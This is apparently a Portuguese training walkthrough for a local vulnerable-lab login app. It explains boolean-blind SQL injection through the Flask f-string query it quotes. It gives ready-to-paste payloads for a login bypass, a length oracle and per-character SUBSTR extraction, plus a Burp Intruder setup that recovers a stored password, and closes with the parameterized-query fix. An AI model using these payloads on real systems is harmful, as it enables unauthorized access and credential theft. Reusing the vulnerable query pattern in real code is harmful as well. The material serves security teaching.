# Walkthrough — sqli-blind-boolean

## 1. Contexto

A app expõe um login de página única. Você digita username e password em `/`, o form dispara um request `POST /login`, e o servidor consulta uma tabela `users` no SQLite procurando uma linha que case com os dois campos. A response é uma de duas páginas, ambas retornadas com HTTP 200:

- `Welcome, <username>!` quando alguma linha casa.
- `Invalid credentials.` quando nenhuma linha casa.

Sem sessão, sem cookie, sem flash message — só um de dois textos no body. Três usuários estão no seed (`alice`, `bob`, `carol`); a senha da alice é `wonderland`. Junto com `users`, o mesmo arquivo de banco tem uma tabela `secrets` espelhando o schema do atom-01, mantida aqui por reconhecimento mas não é o alvo do exploit deste átomo.

O bug, o oracle e a extração blind inteira moram nessa superfície pequena.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/login` monta o SQL assim:

```python
username = request.form.get("username", "")
password = request.form.get("password", "")
# VULNERABLE: user input concatenated into SQL string
query = (
    f"SELECT username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
row = conn.execute(query).fetchone()
```

É a mesma classe de bug do [`sqli-union-basic`](../sqli-union-basic/) — dois valores controlados pelo usuário colados numa string SQL via f-string, sem escape, sem parameter binding. O que muda é o que chega no cliente. Em `sqli-union-basic` a view `/profile` renderizava toda linha retornada como tabela HTML, então um `UNION SELECT` bastava pra exfiltrar dado direto pela response. Aqui a view ignora todas as colunas exceto se o `fetchone()` retornou uma linha ou não — e o template renderiza uma de duas strings dependendo desse único bit. **Diferente do átomo anterior, não há bloco de debug com "Executed query". Blind precisa ser blind** — vazar a query na página derrotaria o objetivo do exercício.

Então o atacante tem a mesma capacidade de injeção mas um canal de exfil bem mais estreito: um único bit por request. O resto deste walkthrough é sobre como esse bit, usado com cuidado, ainda extrai a senha.

## 3. Exploração via Burp Suite

Este átomo é trabalhado inteiramente no Burp Suite (Proxy → Repeater → Intruder). A interface web existe apenas como destino legítimo das requests — todos os passos abaixo acontecem no Burp.

O form de login em `/` dispara um `POST /login` com body form-encoded `username=<...>&password=<...>`. Monte esse request numa nova aba do Repeater apontando pra `127.0.0.1:8006` e mande uma vez com as credenciais do seed (`username=alice&password=wonderland`): o body da response volta com `<h1>Welcome, alice!</h1>`, seu baseline pro estado de sucesso. Cada passo abaixo edita o body e reenvia.

> **Convenção de notação.** Letras maiúsculas isoladas em payloads (`N`, `P`, `C`) são *placeholders de leitura* — substitua por um valor concreto antes de enviar a request. Mandar a letra literal causa erro 500 (SQLite tenta resolver como nome de coluna).

### Uma nota sobre encoding do body

Os átomos anteriores ensinaram uma regra de URL encoding — que a request line `METHOD SP URI SP VERSION` não pode ter espaços literais, então qualquer coisa na query string precisa de `%20`. Aqui o payload não viaja na URI; viaja no body do request como `application/x-www-form-urlencoded`. Parser diferente, mesma ideia:

- O body é uma série de pares `name=value` unidos por `&`.
- Três caracteres têm significado estrutural nessa camada e **precisam** ser percent-encoded dentro de um value: `=` (separador de campo), `&` (separador de par), e `%` (o próprio escape do encoding).
- Espaços em bodies form-encoded são convencionalmente encodados também — ou como `%20` ou como `+`. Os dois decodam de volta pra espaço.
- Aspas, hífens, parênteses, vírgulas e operadores de SQL (`<`, `>`) são todos legais dentro de um value e passam sem encoding.

No Burp Repeater você tem as mesmas duas opções de antes: digite cada espaço como `%20` e deixe o resto literal, ou cole o payload decoded, selecione, e aperte **Ctrl+U** pra encoding agressivo. As duas formas chegam na app Flask como a mesma string depois do body ser parseado.

Cada passo abaixo mostra dois blocos: um **Body (decoded)** pra leitura e um **Body (Burp-ready)** com `%20` substituindo espaços, pronto pra colar direto no Repeater.

### Passo 1 — Confirmar o injection point (login bypass)

Body (decoded):

```
username=alice' --&password=anything
```

Body (Burp-ready):

```
username=alice%27%20--&password=anything
```

Mande. O body da response contém `<h1>Welcome, alice!</h1>`.

Pense no que aconteceu com o SQL. Depois que o parser do body entrega os valores pro Flask, a f-string vira:

```sql
SELECT username FROM users WHERE username = 'alice' --' AND password = 'anything'
```

A `'` que você mandou fechou o literal de string do username. O `--` então comentou o resto da linha, incluindo a checagem `AND password = '...'` que a aplicação queria fazer. O statement reduz pra `SELECT username FROM users WHERE username = 'alice'`, que retorna a linha da alice, o que faz o `fetchone()` retornar truthy, o que faz o template renderizar a página de welcome. Você logou como alice sem saber a senha da alice.

É a mesma técnica do `sqli-union-basic` — fechar literal, comentar o resto — e cumpre o mesmo papel aqui de *âncora*: antes de entrar em terreno blind, prove que o input está mesmo chegando na engine SQL como código.

### Passo 2 — Estabelecer o boolean oracle (ramo TRUE)

A pergunta seguinte é se você consegue empurrar a response pra `Welcome` usando só uma condição lógica, não um username concreto. Tente o payload clássico primeiro:

Body (decoded):

```
username=nobody' OR '1'='1&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271&password=x
```

Mande. Response: `Invalid credentials.`.

Isso provavelmente te surpreendeu. Leia o que de fato rodou:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' AND password = 'x'
```

A pegadinha é a precedência de operadores SQL: `AND` é mais forte que `OR`. A engine agrupa o predicate como `username='nobody' OR ('1'='1' AND password='x')`. O primeiro lado é falso (nenhum user literalmente se chama `nobody`), e o segundo lado exige `password='x'`, que nenhuma linha satisfaz. False OR false → false → `fetchone()` retorna nada → `Invalid credentials.`. O `'1'='1'` que você injetou é verdadeiro mas nunca chega no OR porque o AND consome ele primeiro.

Agora o conserto — mantém tudo igual, só adiciona `--` no final do username:

Body (decoded):

```
username=nobody' OR '1'='1' --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271%27%20--&password=x
```

Mande. Response: `<h1>Welcome, alice!</h1>`.

A única coisa que mudou entre o payload quebrado e o que funciona foi o `--` no final. A query agora é:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' --' AND password = 'x'
```

Tudo a partir do `--` é comentário. O que sobra é `WHERE username = 'nobody' OR '1'='1'`, que é verdadeiro pra toda linha. `fetchone()` retorna a primeira linha da tabela (alice, por ordem de rowid). A response renderiza ela como o usuário logado.

A lição aqui é sobre o `--`, não sobre as aspas: quando você não vê a query, tem que raciocinar sobre precedência de operadores como se tivesse acesso ao parser. A forma mais barata de curto-circuitar isso é comentar tudo depois da condição injetada pra que nada mais consiga re-agrupar a expressão. Uma variável muda entre os dois payloads, uma lição é ensinada.

### Passo 3 — Estabelecer o ramo FALSE

Agora confirme a outra metade do oracle. Mesma forma, mas com uma condição que é falsa pra toda linha:

Body (decoded):

```
username=nobody' OR 1=2 --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%201%3D2%20--&password=x
```

Mande. Response: `Invalid credentials.`.

Duas páginas, dois bodies de response observáveis, perfeitamente distinguíveis no painel Response do Burp:

- Condição verdadeira → `Welcome, alice!`
- Condição falsa → `Invalid credentials.`

Qualquer condição booleana que você consiga expressar em SQL pode agora ser respondida mandando um request e lendo uma sequência de bytes na response. É o momento em que a palavra *blind* clica: você não vê o dado, mas pode perguntar ao banco perguntas de sim-ou-não e ler as respostas direto da página. O resto do ataque é só descobrir o que perguntar.

### Passo 4 — Extrair o comprimento da senha

Sai de "demonstrar o oracle" e entra em *usar* ele. Embute uma subquery que pergunta algo concreto sobre dado real — aqui, se o comprimento da senha da alice é igual a algum número N. Comece com um request concreto que testa se o comprimento é 5:

Body (decoded):

```
username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = 5 --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20(SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%205%20--&password=x
```

Mande. Response: `Invalid credentials.` — o comprimento não é 5.

Agora itere o número no mesmo lugar (no Repeater, edita só o `5`):

- `... = 10 ...` → `Welcome, alice!`
- `... = 15 ...` → `Invalid credentials.`

Conclusão: a senha da alice tem 10 caracteres. Você descobriu um fato sobre um dado que não consegue ler diretamente, lendo um bit por request.

Um atacante real automatizaria isso com Intruder (uma posição, payload set `Numbers` de 1 a 20), mas fazer duas ou três iterações na mão aqui é o suficiente pra sentir o ritmo antes do próximo passo aumentar a escala.

### Passo 5 — Extrair caracteres e automatizar com Burp Intruder

Mesmo truque, uma pergunta mais fina. Em vez de perguntar "o comprimento é N?", pergunta "o caractere na posição P é igual ao candidato C?". `SUBSTR(password, P, 1)` extrai um caractere da senha, e a comparação transforma ele no único bit que o oracle revela.

**A — Sondar o primeiro caractere no Repeater**

Antes de automatizar, valide a técnica na mão. Payload concreto testando se o primeiro caractere é `a`:

Body (decoded):

```
username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'a' --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27a%27%20--&password=x
```

Mande. Response: `Invalid credentials.` — o primeiro caractere não é `a`.

Troca `'a'` por `'w'`, mesma request, manda de novo. Response: `<h1>Welcome, alice!</h1>` — o primeiro caractere é `w`.

Os dois argumentos numéricos do `SUBSTR` têm papéis distintos, e a distinção importa pro próximo passo. O primeiro (`1`) é a *posição* — qual caractere ler, o que você varia pra varrer a senha inteira. O segundo (`1`) é o *tamanho* — quantos caracteres ler, sempre 1, um char por vez.

**B — Automatizar com Burp Intruder**

Fazer isso na mão pra todas as 10 posições × 26 letras seria 260 requests. É pra isso que existe o Intruder. (Os nomes de menu abaixo são do Burp Community Edition; no Pro são idênticos.)

1. **Send to Intruder.** Clique com o botão direito no request que funcionou no Repeater, escolha **Send to Intruder** e vá pra aba Intruder. O request base no editor de **Positions**, antes de marcar qualquer coisa, é:

   ```
   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w' --&password=x
   ```

2. **Marque duas payload positions** com `§...§`:
   - O **primeiro `1`** — o argumento de posição do `SUBSTR`, entre `'alice'),` e `,1)`. Esse varia de `1` a `10`.
   - O **`w`** entre as aspas simples — o caractere candidato. Esse varia de `a` a `z`. Marque só a letra, não as aspas.

   O resultado no editor:

   ```
   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§' --&password=x
   ```

   **Não marque o segundo `1`** — o argumento de tamanho do `SUBSTR`, que fica fixo em 1. Os dois argumentos são um `1` literal no payload base, então é fácil pegar o errado. Se marcar o tamanho em vez da posição, a leitura fica presa na posição 1: o sweep passa a perguntar se os *primeiros N caracteres* são iguais a uma única letra candidata — só o caso `N = 1` pode ser verdadeiro, então você revela a primeira letra e nunca passa dela.

3. **Attack type:** `Cluster bomb` — itera o produto cartesiano dos dois payload sets, toda posição combinada com todo candidato.

4. **Payload set 1 (a posição):**
   - Type: `Numbers`
   - From `1`, To `10`, Step `1`
   - Payload count: 10

5. **Payload set 2 (o candidato):**
   - Type: `Simple list`
   - Cole as 26 letras minúsculas, uma por linha (`a`, `b`, `c`, ..., `z`)
   - Payload count: 26

   **Não use `Brute forcer`** mesmo que pareça o encaixe óbvio. O Brute forcer com o charset `[a-z]` e Max length maior que 1 — o default na maioria das versões do Burp — gera 26⁴ = 456.976 payloads em vez de 26. O `Simple list` é determinístico: gera exatamente o que está na lista.

   Confirme antes de rodar — **Request count: 260** (10 × 26).

6. **Grep — Match.** Em **Settings** dentro da aba do Intruder (ou **Options** em versões mais antigas do Burp), encontre **Grep — Match** e adicione a string literal `Welcome, alice!`. Quando o ataque rodar, o Intruder mostra uma coluna de checkbox por request — o oracle binário, exposto como uma coluna ordenável.

7. **Start attack.** Ordene a tabela de resultados pela coluna `Welcome, alice!`, decrescente. Os 10 hits revelam, em ordem de posição, as letras `w`, `o`, `n`, `d`, `e`, `r`, `l`, `a`, `n`, `d` → `wonderland`.

Essa é a senha armazenada da alice, recuperada sem ela jamais aparecer em uma única response body.

### Por que isso é "blind" — contraste explícito com sqli-union-basic

A causa do bug é idêntica nos dois átomos: input do usuário concatenado em string SQL sem parameter binding. O que difere é o que o atacante consegue ver e portanto a *forma* do exploit.

Em `sqli-union-basic` o canal de exfil é o próprio response body: `UNION` anexa linhas extras, o template renderiza toda coluna retornada, o atacante lê o dado direto da página. O trabalho cabe em três payloads porque cada um retorna o dado em si.

Aqui não há canal de dado. O body tem exatamente duas formas: `Welcome` ou `Invalid`. O atacante inverte o problema — em vez de pedir "me devolva o dado", ele pergunta ao banco "o dado *é igual a* esse candidato?", e usa os dois estados observáveis da response como um único bit. 260 bits de perguntas cuidadosamente escolhidas depois, a senha está reconstruída. Mesmo bug, canal mais estreito, mais requests, mesmo desfecho.

Uma nota de mundo real enquanto estamos no assunto: apps de verdade armazenam senhas como hash, não em texto puro. A técnica blind acima funciona do mesmo jeito contra uma coluna de hash — você estaria extraindo `$2b$12$...` em vez de `wonderland`, o que leva bem mais requests (charset mais largo e string mais longa). A técnica é o que generaliza; a coluna que você está lendo é detalhe deste lab específico.

## 4. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. Com placeholders, o driver do SQLite faz o parse do statement primeiro — sem os valores dos parâmetros — e só depois liga cada input como valor literal dentro do statement já parseado. Nenhum caractere de nenhum dos dois inputs consegue deslocar o parse: `'`, `--`, `OR`, `SELECT`, parênteses, newlines, tudo permanece nos seus respectivos slots de string literal e nunca é reinterpretado como sintaxe SQL.

Rode qualquer payload da seção 3 contra <http://127.0.0.1:8106/login>. Todos retornam `Invalid credentials.` — inclusive o login bypass do Passo 1, que contra a versão vulnerable era passe livre. As duas strings de response não mudaram; essa assimetria é comportamento legítimo de login, não é o bug. O que o atacante perdeu foi qualquer capacidade de injetar uma condição que empurraria a response pra `Welcome`. O oracle continua existindo; o atacante não controla mais ele.
